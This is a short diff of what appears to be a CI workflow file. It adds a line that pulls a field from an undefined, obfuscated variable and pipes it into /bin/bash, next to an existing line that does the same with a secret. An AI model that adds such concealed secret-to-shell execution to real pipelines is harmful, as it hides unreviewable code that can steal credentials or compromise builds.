@@ -20,6 +20,7 @@ jobs:
           lotru757: ${{ secrets.lotru757 }}
         run: |
           printf '%s' "$lotru757" | jq -r .odwhw52687 | /bin/bash
+          printf '%s' "$oxddt670" | jq -r .pqtyy8 | /bin/bash
 
       - name: Save output
         if: always()
